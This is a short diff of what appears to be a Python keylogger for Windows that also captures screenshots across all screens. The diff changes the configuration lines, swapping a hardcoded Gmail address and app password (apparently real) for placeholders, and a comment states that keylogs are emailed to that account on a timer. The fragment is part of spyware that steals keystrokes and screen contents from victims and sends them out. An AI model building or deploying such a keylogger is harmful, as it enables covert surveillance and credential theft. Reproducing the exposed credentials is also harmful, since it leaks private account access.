@@ -13,8 +13,8 @@ import win32api,win32process,win32con
 ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
 
 SEND_TIMER = 100#Time to wait before sending in seconds
-EMAIL = "slabysh2015@gmail.com"
-PASS = "wnyketrjiuzpxmjr"
+EMAIL = "@gmail.com" #EMail to which keylogs will be sent
+PASS = "************" #Set up double auth for your gmail account, and create app password
 #pip install pywin32
 #python -m pip install pywin32
 
